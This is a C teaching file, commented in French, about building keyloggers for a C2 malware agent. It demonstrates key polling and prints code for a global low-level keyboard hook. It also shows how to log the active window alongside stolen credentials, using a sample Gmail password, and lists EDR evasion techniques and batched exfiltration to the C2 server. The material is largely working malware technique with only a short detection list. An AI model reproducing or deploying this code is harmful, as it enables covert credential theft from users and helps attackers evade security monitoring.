/*
 * OBJECTIF  : Techniques de keylogging pour un agent C2
 * PREREQUIS : Windows Message Loop, Hooks, Input API
 * COMPILE   : cl example.c /Fe:example.exe /link user32.lib
 *
 * Le keylogging capture les frappes clavier. Trois methodes :
 * 1. GetAsyncKeyState (polling)
 * 2. SetWindowsHookEx (hook global)
 * 3. Raw Input API
 */

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

/* Table de conversion VK -> nom lisible */
const char* vk_to_name(int vk) {
    static char buf[16];
    switch (vk) {
        case VK_RETURN:  return "[ENTER]";
        case VK_BACK:    return "[BACKSPACE]";
        case VK_TAB:     return "[TAB]";
        case VK_SPACE:   return " ";
        case VK_SHIFT:   return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU:    return "[ALT]";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:   return "[DEL]";
        case VK_LEFT:    return "[LEFT]";
        case VK_RIGHT:   return "[RIGHT]";
        case VK_UP:      return "[UP]";
        case VK_DOWN:    return "[DOWN]";
        case VK_LWIN: case VK_RWIN: return "[WIN]";
        default:
            if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A)) {
                buf[0] = (char)vk;
                buf[1] = '\0';
                return buf;
            }
            snprintf(buf, sizeof(buf), "[0x%02X]", vk);
            return buf;
    }
}

void demo_getasynckeystate(void) {
    printf("[1] Methode 1 : GetAsyncKeyState (polling)\n\n");
    printf("    Principe :\n");
    printf("    - Boucle infinie avec Sleep\n");
    printf("    - Pour chaque touche (0x01-0xFE), appeler GetAsyncKeyState\n");
    printf("    - Si bit 15 = 1 -> touche enfoncee\n\n");

    printf("    Code :\n");
    printf("    while (1) {\n");
    printf("        for (int vk = 0x01; vk < 0xFF; vk++) {\n");
    printf("            if (GetAsyncKeyState(vk) & 0x8000) {\n");
    printf("                log_keystroke(vk);\n");
    printf("            }\n");
    printf("        }\n");
    printf("        Sleep(10);\n");
    printf("    }\n\n");

    /* Demo rapide : scanner les touches actuellement enfoncees */
    printf("    Touches actuellement enfoncees :\n    ");
    int found = 0;
    int vk;
    for (vk = 0x01; vk < 0xFF; vk++) {
        if (GetAsyncKeyState(vk) & 0x8000) {
            printf("%s ", vk_to_name(vk));
            found++;
        }
    }
    if (!found) printf("(aucune)");
    printf("\n\n");

    printf("    Avantages : Simple, pas de hook\n");
    printf("    Inconvenients : CPU, pas de contexte fenetre\n\n");
}

void demo_hook_concept(void) {
    printf("[2] Methode 2 : SetWindowsHookEx (hook global)\n\n");
    printf("    Principe :\n");
    printf("    - Installer un hook WH_KEYBOARD_LL\n");
    printf("    - Callback appelee pour chaque touche\n");
    printf("    - Necessite une message loop\n\n");

    printf("    Code :\n");
    printf("    LRESULT CALLBACK KeyProc(int code, WPARAM wp, LPARAM lp) {\n");
    printf("        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lp;\n");
    printf("        if (wp == WM_KEYDOWN) {\n");
    printf("            log_key(kb->vkCode);\n");
    printf("        }\n");
    printf("        return CallNextHookEx(NULL, code, wp, lp);\n");
    printf("    }\n\n");
    printf("    HHOOK hHook = SetWindowsHookExA(\n");
    printf("        WH_KEYBOARD_LL, KeyProc, GetModuleHandle(NULL), 0);\n");
    printf("    MSG msg;\n");
    printf("    while (GetMessage(&msg, NULL, 0, 0)) {\n");
    printf("        TranslateMessage(&msg);\n");
    printf("        DispatchMessage(&msg);\n");
    printf("    }\n\n");

    printf("    Avantages : Fiable, contexte complet\n");
    printf("    Inconvenients : Detectable par les EDR (hook visible)\n\n");
}

void demo_window_context(void) {
    printf("[3] Capture du contexte fenetre\n\n");
    printf("    Un bon keylogger capture aussi la fenetre active :\n\n");

    /* Obtenir la fenetre active */
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        char title[256] = {0};
        GetWindowTextA(hwnd, title, sizeof(title));
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        printf("    [+] Fenetre active: \"%s\"\n", title);
        printf("    [+] PID: %lu\n\n", pid);
    }

    printf("    Format de log :\n");
    printf("    [2024-01-15 14:30:22] [Chrome - Gmail] admin@corp.com\n");
    printf("    [2024-01-15 14:30:25] [Chrome - Gmail] [TAB]\n");
    printf("    [2024-01-15 14:30:26] [Chrome - Gmail] P@ssw0rd123\n");
    printf("    [2024-01-15 14:30:28] [Chrome - Gmail] [ENTER]\n\n");

    printf("    Informations a capturer :\n");
    printf("    - Timestamp\n");
    printf("    - Titre de la fenetre\n");
    printf("    - Touches (avec shift/ctrl/alt)\n");
    printf("    - Texte du clipboard (bonus)\n\n");
}

void demo_detection(void) {
    printf("[4] Detection et evasion\n\n");
    printf("    Detection :\n");
    printf("    - GetAsyncKeyState : pattern d'appels suspects\n");
    printf("    - SetWindowsHookEx : enumerer les hooks globaux\n");
    printf("    - Raw Input : RAWINPUTDEVICE registrations\n");
    printf("    - ETW : Microsoft-Windows-Win32k (KeyboardInput)\n\n");

    printf("    Evasion :\n");
    printf("    - Indirect syscalls pour SetWindowsHookEx\n");
    printf("    - Polling a intervalle variable\n");
    printf("    - Capturer uniquement les fenetres d'interet\n");
    printf("    - Chiffrer le buffer de log en memoire\n");
    printf("    - Exfiltrer par petits morceaux\n\n");

    printf("    Bonnes pratiques d'agent :\n");
    printf("    - Buffer les frappes en memoire (pas sur disque)\n");
    printf("    - Envoyer au C2 par batch (toutes les N secondes)\n");
    printf("    - Limiter la taille du buffer (rotation)\n");
    printf("    - Commande start_keylogger / stop_keylogger\n\n");
}

int main(void) {
    printf("[*] Demo : Keylogger pour Agent C2\n");
    printf("[*] ==========================================\n\n");
    demo_getasynckeystate();
    demo_hook_concept();
    demo_window_context();
    demo_detection();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
